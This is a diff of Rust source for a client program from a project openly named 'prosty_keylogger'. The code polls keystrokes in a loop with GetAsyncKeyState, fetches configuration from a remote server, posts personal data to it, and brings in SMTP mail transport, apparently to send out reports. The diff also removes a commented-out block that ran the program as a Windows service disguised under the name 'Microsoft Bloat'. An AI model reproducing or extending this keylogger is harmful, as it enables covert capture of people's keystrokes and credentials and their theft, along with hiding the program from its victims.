@@ -1,25 +1,16 @@
 mod options;
 
 use std::{env, thread, time};
-use std::env::Args;
-use std::ffi::OsString;
 use lettre::message::header::ContentType;
 use lettre::{SmtpTransport, Transport};
 use lettre::transport::smtp::authentication::Credentials;
-use log::{debug, error, info, LevelFilter, trace};
-use tokio::net::windows::named_pipe::PipeMode::Message;
-use windows::UI::Core::CoreVirtualKeyStates;
+use log::{error, info, LevelFilter, trace};
 use windows::Win32::UI::Input::KeyboardAndMouse::GetAsyncKeyState;
 use std::fmt::Write;
 use std::path::{Path, PathBuf};
-use std::time::{Duration, SystemTime};
-use anyhow::Error;
+use std::time::{Duration};
 use clap::Parser;
 use reqwest::Url;
-use serde_json::value::Index;
-use windows_service::{define_windows_service, service_control_handler, service_dispatcher};
-use windows_service::service::{ServiceControl, ServiceControlAccept, ServiceExitCode, ServiceState, ServiceStatus, ServiceType};
-use windows_service::service_control_handler::ServiceControlHandlerResult;
 use prosty_keylogger::common::{Gender, MailConfiguration, PersonalData, ReportConfig, setup_logger, TaskConfiguration};
 use crate::options::ClientArgs;
 //CoreVirtualKeyStates
@@ -84,7 +75,6 @@ async fn get_config(url: &Url, personal_data: Option<&PersonalData>) -> Result<T
         None => reqwest::get(url.to_owned()).await?.text().await?,
         Some(data) => {
             let client = reqwest::Client::new();
-            let json = serde_json::to_string(&data)?;
             client.post(url.join("/hello")?).json(&data).send().await?.text().await?
         }
     };
@@ -133,7 +123,7 @@ fn client(url: &Url) -> anyhow::Result<()>{
 
     loop{
         thread::sleep(milli);
-        let mut keys = check_key();
+        let keys = check_key();
 
         if !keys.is_empty(){
             trace!("{:02x?}", keys);
@@ -152,62 +142,9 @@ fn client(url: &Url) -> anyhow::Result<()>{
     }
 
 }
-/*
-define_windows_service!(ffi_service_main, service_main);
-fn service_main(arguments: Vec<OsString>){
-    match run_service(arguments){
-        Ok(_) => {}
-        Err(err) => println!("Error in service: {err}")
-    }
 
 
-}
-
-fn run_service(arguments: Vec<OsString>) -> anyhow::Result<()>{
-    let event_handler = move |control_event| -> ServiceControlHandlerResult {
-        match control_event {
-            ServiceControl::Stop => {
-                // Handle stop event and return control back to the system.
-                ServiceControlHandlerResult::NoError
-            }
-            // All services must accept Interrogate even if it's a no-op.
-            ServiceControl::Interrogate => ServiceControlHandlerResult::NoError,
-            _ => ServiceControlHandlerResult::NotImplemented,
-        }
-    };
-
-    //win_service_logger::init();
-    let status_handle = service_control_handler::register("Microsoft Bloat", event_handler)?;
-    let next_status = ServiceStatus {
-        // Should match the one from system service registry
-        service_type: ServiceType::OWN_PROCESS,
-        // The new state
-        current_state: ServiceState::Running,
-        // Accept stop events when running
-        controls_accepted: ServiceControlAccept::STOP,
-        // Used to report an error when starting or stopping only, otherwise must be zero
-        exit_code: ServiceExitCode::Win32(0),
-        // Only used for pending states, otherwise must be zero
-        checkpoint: 0,
-        // Only used for pending states, otherwise must be zero
-        wait_hint: Duration::default(),
-        process_id: None,
-    };
-
-    // Tell the system that the service is running now
-    //def_logger()?;
-    status_handle.set_service_status(next_status)?;
-    //def_logger()?;
-
-    let args = ClientArgs::parse_from(arguments);
-
-    let url = Url::parse(&args.assistant)?;
-    client(&url)
-}
-
- */
-
-fn def_logger() -> anyhow::Result<()>{
+pub fn def_logger() -> anyhow::Result<()>{
     let p = PathBuf::from(env::var("LOCALAPPDATA")?);
     let p = p.join("temp/client.tmp");
 
